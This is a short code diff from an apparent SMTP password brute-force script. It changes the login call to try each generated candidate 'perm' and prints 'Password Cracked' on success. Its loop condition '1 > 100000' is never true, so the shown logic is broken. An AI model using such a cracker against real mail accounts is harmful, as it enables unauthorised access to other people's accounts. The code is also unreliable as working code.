@@ -20,7 +20,7 @@ for n in range(6, 12+1):
 
               while(1 > 100000):
                try:
-                   smtpserver.login(user, symbols)
+                   smtpserver.login(user, perm)
 
                    print("[+] Password Cracked:", perm)
                    break
